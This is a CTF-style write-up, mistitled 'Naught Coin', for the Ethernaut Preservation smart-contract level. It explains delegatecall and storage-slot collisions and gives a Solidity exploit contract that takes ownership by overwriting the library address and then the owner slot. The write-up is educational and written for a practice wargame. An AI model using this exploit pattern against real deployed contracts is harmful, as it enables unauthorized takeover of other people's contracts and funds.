# Writeup for Naught Coin

- Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you're new to Solidity and haven't deployed a smart contract before, you can learn how to do so using Remix [here](https://youtu.be/3xNFZI8Ste4?si=i3cWN87OpX85zp6k).

### Challenge Description

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

- Look into Solidity's documentation on the delegatecall low-level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
- Understand what it means for delegatecall to be context-preserving.
- Understand how storage variables are stored and accessed.
- Understand how casting works between different data types.

### Contract Explanation

If you understand the contract, you can move on to the [exploit](#exploit) part. If you're a beginner, please read the Contract Explanation to gain a better understanding of Solidity.

<details>
<summary>Click to view the source contract and contract explanation</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}

```

There are two contracts in the challenge: `Preservation` and `LibraryContract`. First, I will explain `LibraryContract`.

`LibraryContract` has a state variable named `storedTime` of type **uint256**. The value of `storedTime` will be updated in the `setTime()` function.

```solidity
function setTime(uint256 _time) public {
    storedTime = _time;
}

```

The above function named `setTime()` takes a `uint256` argument as input. Whenever the function is called, it will change the value of `storedTime`.

The contract `Preservation` has the following state variables: `timeZone1Library` of type **address**, `timeZone2Library` of type **address**, `owner` of type **address**, `storedTime` of type **uint256**, and `setTimeSignature` of type **bytes4**.

`setTimeSignature` is initialized with the function selector of the `setTime()` function.

```solidity
constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
}
```

The `constructor` takes two arguments of type address as input and sets the `timeZone1Library` and `timeZone2Library` with the addresses passed as inputs. It also sets the owner to `msg.sender` (the contract deployer). `timeZone1Library` and `timeZone2Library` are instances of `LibraryContract`.

```solidity
function setFirstTime(uint256 _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
}

```

The function `setFirstTime()` takes a **uint256** as an argument and makes a delegate call to `timeZone1Library` with the data as the function selector of the `setTime()` function and the timestamp passed to `setFirstTime()`.

```solidity
function setSecondTime(uint256 _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
}
```

The function `setSecondTime()` takes a **uint256** as an argument and makes a delegate call to `timeZone1Library` with the data as the function selector of the `setTime()` function and the timestamp passed to `setSecondTime()`.

Both of the above functions will make a delegate call to `LibraryContract` by calling the `setTime()` function.

</details>

### Key Concepts To Learn

To exploit this challenge, we need to dive deep into how a delegate call works.

I hope you have solved the Delegation challenge. If not, click [here](../Delegation/WriteUp.md) to solve the challenge. There, I have explained the difference between `call`, `delegatecall`, and `staticcall`.

Check the below example.

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract contract_one{
    bool public locked;
    uint256 public Number;

    function unlock()public{
        locked=false;
    }

    function changeNumber(uint256 _num)public{
        Number=_num;
    }
}

contract contract_two{
    bool public locked=true;
    uint256 public Number=78;
    contract_one contract_One;
    constructor(address _addr){
        contract_One =contract_one(_addr);
    }

    function Change_Number(uint256 _num)public{
        (bool success, bytes memory data) = address(contract_One).delegatecall(abi.encodeWithSignature("changeNumber(uint256)",_num));
        require(success,"Call failed");
    }

    function Unlock()public{
        (bool success, bytes memory data) = address(contract_One).delegatecall(abi.encodeWithSignature("unlock()"));
        require(success,"Call failed");
    }

}

```

Try out this example in Remix. It will help you understand delegate calls better. If you have no idea about delegate calls, check my write-up for the Delegation challenge.

The `Change_Number()` function in `contract_two` makes a delegate call to `contract_one`, calling the `changeNumber()` function in `contract_one`. The `changeNumber()` function in `contract_one` will set the variable `Number` to the argument passed during the call. However, since it is a delegate call, the variable `Number` won't be changed in `contract_one`; it will be changed in `contract_two`.

Okay, we can understand that when we make a delegate call from one contract to another contract, the state changes will be done in the calling contract and the logic execution will be done in the called contract.

In our example, it is changing the `Number`, but how does it work? How can `contract_one` know where the state variable `Number` is located?

Simply put, it works based on storage layout. Two contracts should have the same storage layout. If we check our example, `contract_one` has state variables **bool** and **uint256**, and `contract_two` has state variables **bool**, **uint256**, and **contract_one**. So when `contract_two` makes a delegate call to `contract_one` and the function changes `Number`, it will update the `uint256` variable. Since `contract_two` also has a `uint256` at the same position, it will be updated in `contract_two`.

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract contract_one{
    bool public locked;
    uint256 public Number;

    function unlock()public{
        locked=false;
    }

    function changeNumber(uint256 _num)public{
        Number=_num;
    }
}

contract contract_two{
    contract_one public contract_One;
    bool public locked=true;
    uint256 public Number=78;
    constructor(address _addr){
        contract_One =contract_one(_addr);
    }

    function Change_Number(uint256 _num)public{
        (bool success, bytes memory data) = address(contract_One).delegatecall(abi.encodeWithSignature("changeNumber(uint256)",_num));
        require(success,"Call failed");
    }

    function Unlock()public{
        (bool success, bytes memory data) = address(contract_One).delegatecall(abi.encodeWithSignature("unlock()"));
        require(success,"Call failed");
    }

}


```

In our `contract_two`, instead of using `contract_one` as the third state variable, if we use it as the first variable, when we delegate call to the `unlock()` function in `contract_one`, it will assume that the first variable is a `bool` and make changes. But in our `contract_two`, the first variable is of type **contract_one**. When the `unlock()` function makes changes, it will directly overwrite the **contract_One**.

Try out the above example. Deploy two contracts. While deploying, pass the address of `contract_one` to the constructor of `contract_two`. Once it is deployed, check the value stored in the variable **contract_One** in `contract_two`. Then call the `Unlock()` function in `contract_two`. Once the call is done, check the value stored in the variable **contract_One** in `contract_two`. You will observe that the last byte has been overwritten to `00 (false)`.

I hope you understand how delegate calls work.

### Exploit

Our goal is to claim ownership of the contract.

```solidity
function setFirstTime(uint256 _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
}
```

When we call the above function, it makes a delegate call to `LibraryContract`, calling the function `setTime()`. Since it is a delegate call, if `setTime()` makes any changes to state variables, those changes will be done in the `Preservation` contract.

```solidity
function setTime(uint256 _time) public {
    storedTime = _time;
}
```

The function `setTime()` will set the **storedTime** to the argument passed during the function call. If we check the `LibraryContract`, the variable **storedTime** is in `slot0`. If we check the `slot0` in the `Preservation` contract, we can find **timeZone1Library**. So when we call `setFirstTime()` with an argument as a `uint` in the `Preservation` contract, because of the delegate call, it will change the value at `slot0` in the `Preservation` contract to the timestamp passed to `setFirstTime()` during the call.

So while calling `setFirstTime()`, instead of passing time as an argument, if we pass an address converted into a **uint256**, the next time we make a call to `setFirstTime()`, it will make a delegate call to our address. This is because in the `setFirstTime()` function, the address of the callee is retrieved from **timeZone1Library**. Since the address is changed, it will make a call to whatever address is stored in **timeZone1Library**.

So when we call the `setFirstTime()` for the first time, we pass our exploit contract address. We need to write our exploit contract such that it should have a `setTime()` function since the delegate call is made to call the `setTime()` function, and the exploit contract's storage layout should be the same as the `Preservation` contract.

It's not necessary to make the storage layout exactly the same as the `Preservation` contract, but we need to make sure that the second slot is an address because the owner in the `Preservation` contract is in `slot2`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Preservation} from "./Preservation.sol";

contract ExploitPreservation{
    Preservation preservation;
    uint256 addr=uint160(address(this));
    address public owner;

    constructor(address _addr){
        preservation=Preservation(_addr);
    }

    function setTime(uint256 _time)public{
        owner= // __YOUR__CONTRACT__ADDRESS;
    }

    function Exploit()public{
        preservation.setFirstTime(addr);
        preservation.setFirstTime(addr);
    }


}

```

In the `setTime()` function, first it calls `setFirstTime()` with our exploit contract address. Once the first line is executed, `timeZone1Library` is set to our exploit contract address. When the second line is executed, the next call will be made to our exploit contract, calling the `setTime()` function. In the `setTime()` function in our exploit contract, we are changing the value at `slot2`, so it will change the value at `slot2` in the `Preservation` contract. In the `Preservation` contract, `slot2` is used for the owner's address. Once the `Exploit()` call is done, our challenge will be completed.

Don't forget to change the address of the owner in the `setTime()` function in the `ExploitPreservation` contract to your wallet address.

Once the calls are done, you can check whether the owner is changed or not by entering the following in the console:

```javascript
> await contract.owner()
```

You have learned a lot of things. Make sure you understand everything clearly, especially delegate calls.

### Key Takeaways

When using delegate calls, it is important to ensure that the two contracts have the same storage layout. This means that the variables in both contracts should be in the same order and have the same data types. By doing so, the delegate call can correctly access and modify the desired variables in the calling contract.

Additionally, understanding how delegate calls work and their implications is crucial. Delegate calls allow for the execution of code from another contract while preserving the context of the calling contract. This means that state changes will occur in the calling contract, but the logic execution will happen in the called contract.

By leveraging delegate calls effectively, you can exploit vulnerabilities and manipulate the state of contracts to achieve desired outcomes, such as claiming ownership or executing specific functions.

Remember to thoroughly understand the concepts and practice with examples to solidify your understanding of delegate calls and their usage in smart contract development.

<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>
